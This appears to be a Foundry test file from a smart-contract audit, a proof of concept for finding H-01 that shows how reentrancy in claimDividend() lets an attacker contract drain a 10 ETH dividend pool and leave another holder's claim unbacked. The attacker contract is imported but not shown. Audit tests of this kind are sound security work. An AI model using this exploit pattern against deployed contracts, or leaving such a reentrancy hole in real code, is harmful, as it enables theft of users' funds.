// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {BaseSetup} from "./BaseSetup.sol";
import {ReentrantClaimer} from "./attackers/ReentrantClaimer.sol";

/// @notice H-01 (High) - Reentrancy in `claimDividend()` drains the dividend pool.
contract H01_ReentrancyClaimDividend is BaseSetup {
    ReentrantClaimer internal attacker;

    function setUp() public {
        _deploy();
        attacker = new ReentrantClaimer(address(token));

        // The pool holds 10 ETH. The attacker is entitled to 1 of them.
        vm.deal(deployer, 10 ether);
        vm.startPrank(deployer);
        token.depositDividend{value: 1 ether}(address(attacker));
        token.depositDividend{value: 9 ether}(alice);
        vm.stopPrank();
    }

    function test_H01_attacker_drains_entire_dividend_pool() public {
        assertEq(address(token).balance, 10 ether, "pool should start at 10 ETH");
        assertEq(token.pendingDividend(address(attacker)), 1 ether, "attacker is owed 1 ETH");

        attacker.attack();

        // The attacker walked away with the whole pool, not just its 1 ETH share.
        assertEq(address(attacker).balance, 10 ether, "attacker drained the pool");
        assertEq(address(token).balance, 0, "pool is empty");
        assertGt(attacker.reentries(), 0, "the drain happened through re-entry");

        // Alice is still recorded as owed 9 ETH that no longer exists.
        assertEq(token.pendingDividend(alice), 9 ether, "alice's claim is now unbacked");
        vm.prank(alice);
        vm.expectRevert("ETH_TRANSFER_FAILED");
        token.claimDividend();
    }
}
